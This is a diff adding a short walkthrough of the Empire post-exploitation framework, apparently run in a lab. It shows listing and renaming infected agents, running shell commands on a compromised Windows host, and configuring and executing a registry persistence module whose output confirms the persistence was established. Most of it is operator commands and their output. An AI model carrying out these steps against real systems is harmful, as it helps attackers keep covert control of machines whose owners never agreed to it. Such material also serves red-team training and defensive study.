@@ -1,0 +1,67 @@
+Empire - Interacting With Shell Commands and Modules
+
+
+View and manage infected hosts in the agents menu
+
++ Check active agents
+	# (Empire) > agents
+
+	[*] Active agents:
+
+	  Name            Lang  Internal IP     Machine Name    Username            Process             Delay    Last Seen
+	  ---------       ----  -----------     ------------    ---------           -------             -----    --------------------
+	  C96YSLZN        ps    192.168.202.148 DESKTOP-JC076ST *DESKTOP-JC076ST\Tarpowershell/2348     1/0.0    2019-09-03 10:09:10
+
++ Rename active agents
+	# (Empire) > rename <old agent name> <new agent name>
+	# (Empire) > rename C96YSLZN TargetMe
+	# (Empire: agents) > agents
+
+	[*] Active agents:
+
+	  Name            Lang  Internal IP     Machine Name    Username            Process             Delay    Last Seen
+	  ---------       ----  -----------     ------------    ---------           -------             -----    --------------------
+	  TargetMe        ps    192.168.202.148 DESKTOP-JC076ST *DESKTOP-JC076ST\Tarpowershell/2348     1/0.0    2019-09-03 10:17:33
+
++ Interacting with the agent
+	# (Empire) > interact <Agent Name>
+	# (Empire) > interact TargetMe
+
++ Execute shell commands
+	# (Empire: TargetMe) > shell <shell commands>
+	# (Empire: TargetMe) > shell ipconfig
+	
+	Windows IP Configuration
+
+	Ethernet adapter Ethernet0:
+
+	   Connection-specific DNS Suffix  . : localdomain
+	   Link-local IPv6 Address . . . . . : fe80::817e:8857:d838:2917%3
+	   IPv4 Address. . . . . . . . . . . : 192.168.202.148
+	   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+	   Default Gateway . . . . . . . . . : 192.168.202.2
+
+	..Command execution completed.
+
+
+Using Empire PowerShell Module
+
++ Use Empire module
+	# (Empire: TargetMe) > usemodule <name of module>
+	# (Empire: TargetMe) > usemodule persistence/elevated/registry*
+	
++ Check module option
+	# (Empire: powershell/persistence/elevated/registry) > info
+
++ Configuring module option
+	# (Empire: powershell/persistence/elevated/registry) > set Listener http
+
++ Once the module is configured to your liking, execute the module
+
+	# (Empire: powershell/persistence/elevated/registry) > execute
+	  
+	  [>] Module is not opsec safe, run? [y/N] y
+	  (Empire: powershell/persistence/elevated/registry) > 
+	  Registry persistence established using listener http stored in HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug.
+
++ The module is succesfully executed in the target machine
